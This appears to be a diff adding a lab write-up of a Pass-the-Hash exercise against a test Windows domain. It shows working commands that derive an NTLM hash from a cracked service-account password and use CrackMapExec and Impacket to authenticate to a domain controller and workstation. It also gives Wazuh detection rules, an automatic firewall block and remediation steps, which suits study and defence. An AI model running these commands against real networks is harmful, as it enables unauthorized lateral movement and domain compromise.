@@ -1,1 +1,100 @@
+# Phase 3 — Pass-the-Hash (PtH)
 
+## Overview
+Pass-the-Hash is a lateral movement technique where an attacker uses a captured 
+NTLM hash to authenticate to remote systems without knowing the plaintext password.
+In this phase, the NTLM hash of svc-mssql (obtained from Phase 2) was used to 
+authenticate to WORKSTATION01 and DC01 via SMB.
+
+## MITRE ATT&CK
+| Field | Value |
+|---|---|
+| Tactic | Lateral Movement, Defense Evasion |
+| Technique | T1550.002 — Pass the Hash |
+| Sub-technique | T1078.002 — Domain Accounts |
+
+## Environment
+| Component | Details |
+|---|---|
+| Attacker | Kali Linux (10.0.0.99) |
+| Target 1 | DC01 — Windows Server 2022 (10.0.0.10) |
+| Target 2 | WORKSTATION01 — Windows 10 Pro (10.0.0.30) |
+| Tools | CrackMapExec, Impacket smbclient.py |
+| Hash Source | Phase 2 — svc-mssql cracked password: Password1 |
+
+## Attack Steps
+
+### 1. Generate NTLM Hash from Plaintext Password
+```bash
+python3 -c "import hashlib; print(hashlib.new('md4', 'Password1'.encode('utf-16le')).hexdigest())"
+# Result: 64f12cddaa88057e06a81b54e73b949b
+```
+
+### 2. Verify Hash on DC01 with CrackMapExec
+```bash
+crackmapexec smb 10.0.0.10 -u svc-mssql -H 64f12cddaa88057e06a81b54e73b949b -d SOC.local
+# Result: [+] SOC.local\svc-mssql:64f12cddaa88057e06a81b54e73b949b
+```
+
+### 3. SMB Lateral Movement to WORKSTATION01
+```bash
+python3 smbclient.py -hashes :64f12cddaa88057e06a81b54e73b949b SOC.local/svc-mssql@10.0.0.30
+# Accessible shares: ADMIN$, C$, IPC$
+```
+
+## Evidence
+| File | Description |
+|---|---|
+| `Evidence/Screenshots/phase3-crackmapexec.png` | CrackMapExec hash confirmation |
+| `Evidence/Screenshots/phase3-smbclient-shares.png` | SMB shares accessed via hash |
+| `Evidence/Screenshots/phase3-wazuh-pth-detected.png` | Wazuh alert T1550.002 |
+| `Evidence/Screenshots/phase3-active-response-config.png` | Active Response configuration |
+
+## Detection
+| Source | Event ID | Indicator |
+|---|---|---|
+| Windows Security Log | 4624 | NTLM Logon Type 3 — svc-mssql from Kali IP |
+| Wazuh Rule 100020 | level 14 | NTLM Network Logon — possible PtH |
+| Wazuh Rule 100021 | level 15 | CRITICAL: Repeated NTLM logons |
+| Wazuh Built-in 92652 | level 6 | Pass the Hash — T1550.002 |
+
+## Wazuh Detection Rules
+```xml
+<!-- Pass-the-Hash Detection -->
+<rule id="100020" level="14">
+  <if_group>windows</if_group>
+  <field name="win.system.eventID">4624</field>
+  <field name="win.eventdata.logonType">3</field>
+  <field name="win.eventdata.authenticationPackageName">NTLM</field>
+  <description>NTLM Network Logon — possible Pass-the-Hash (T1550.002)</description>
+  <mitre><id>T1550.002</id></mitre>
+</rule>
+
+<!-- Repeated PtH — CRITICAL -->
+<rule id="100021" level="15" frequency="3" timeframe="60">
+  <if_matched_sid>100020</if_matched_sid>
+  <description>CRITICAL: Repeated NTLM logons — Pass-the-Hash attack confirmed</description>
+  <mitre><id>T1550.002</id></mitre>
+</rule>
+```
+
+## Active Response
+Wazuh is configured to automatically block the attacker IP via `firewall-drop` 
+when rule 100020 or 100021 triggers — isolating the compromised source within seconds.
+```xml
+<active-response>
+  <command>firewall-drop</command>
+  <location>local</location>
+  <rules_id>100020,100021</rules_id>
+  <timeout>300</timeout>
+</active-response>
+```
+
+## Remediation
+| Action | Priority |
+|---|---|
+| Enable Protected Users Security Group | HIGH |
+| Disable NTLM authentication domain-wide | HIGH |
+| Implement LAPS for local admin accounts | HIGH |
+| Enable Windows Defender Credential Guard | MEDIUM |
+| Monitor Event ID 4624 Logon Type 3 from external IPs | MEDIUM |
